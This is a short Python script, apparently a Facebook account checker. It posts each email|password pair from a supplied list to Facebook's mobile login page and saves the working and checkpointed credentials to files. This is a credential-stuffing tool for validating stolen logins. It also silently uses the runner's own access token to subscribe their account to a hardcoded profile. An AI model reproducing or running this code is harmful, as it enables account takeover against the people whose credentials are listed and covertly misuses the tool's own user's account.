import requests,os

class Cekun:
	def __init__(self):
		self.req=requests.Session()
		self.ken=open('toket/token.txt','r').read()
		self.u='https://mbasic.facebook.com/login'
		self.cek()

	def cek(self):
		try:
			os.mkdir('result')
		except: pass
		print("""
		;;;;;;;;;;;;;;;;;;;;
		; Checker Accounts ;
		;;;;;;;;;;;;;;;;;;;;
		""")
		folme=self.req.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+self.ken)
		try:
			os.mkdir('result/checker')
		except: pass
		fil=input('[info] list sparator email|pass\n[?] list accounts: ')
		file=open(fil,'r').read().splitlines()
		print()
		for x in file:
			p=x.split('|')
			id=p[0]
			pas=p[1]
			self.login(id,pas)

	def login(self,id,pas):
		rr=self.req.post(self.u,data={'email':id,'pass':pas})
		if 'save-device' in rr.text or 'm_sess' in rr.text:
			print(f'\033[97m[\033[92mAlive\033[97m] {id} - {pas}')
			f=open('result/checker/alive.txt','a')
			f.write(f'{id}|{pas}\n')
			f.close()
		elif 'checkpoint' in rr.text:
			print(f'\033[97m[\033[93mCheckP\033[97m] {id} - {pas}')
			c=open('result/checker/check.txt','a')
			c.write(f'{id}|{pas}\n')
			c.close()

Cekun()
print('\n[info] alive file saved as \033[94mresult/checker/alive.txt\033[97m')
print('[info] checkpoint file saved as \033[94mresult/checker/check.txt')